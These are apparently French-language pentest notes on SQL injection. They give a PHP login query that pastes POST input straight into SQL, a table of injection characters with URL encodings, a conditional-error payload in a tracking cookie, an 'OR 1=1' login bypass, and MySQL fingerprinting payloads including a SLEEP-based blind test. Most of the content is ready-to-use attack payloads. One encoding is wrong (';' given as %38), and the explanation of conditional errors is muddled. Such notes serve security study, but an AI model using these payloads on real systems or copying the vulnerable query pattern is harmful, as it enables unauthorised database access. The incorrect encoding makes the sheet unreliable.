Structured Query Language

# Code vulnérable:	
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ php
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ sql
SELECT * FROM products WHERE category = ‘Gifts’ AND released = 1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Détection
 | injection | url encode |
 | --- | --- |
 | '	| 				%27|
 | ' OR 1=1-- | |
 | '; waitfor delay ('0:0:10')--| | 
 | "	| 	%22 |
 | #	| 				%23 |
 | ;	| 				%38 |
 | )	| 				%29 |

# Erreurs conditionnelles
L'intérieur du *SELECT* est évalué après avoir fait la requête “FROM et WHERE”. Si elle échoue, alors il n'y a pas d'erreur.
TrackingId=on1Q12tefZEr6qFX' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) else ‘’END FROM users WHERE username='administrators') ||'

# Injection
Injecter suivant pour condition toujours  vrai
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nom' OR 1=1 -- //
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	
# Identification
MySQL

|                  Payload                |         Quand utiliser   |     Sortie Attendu     | Mauvaise sortie                        |
| --- | --- | --- | --- |
| SELECT @@Version | résultat de requète | version de MySql | Version MSSQL ou erreur |
| SELECT POW(1,1) | sortie numérique seulement | 1 | erreur |
| SELECT SLEEP(5) | Aveugle | délai 5 secondes puis retourne 0 | pas de délai |
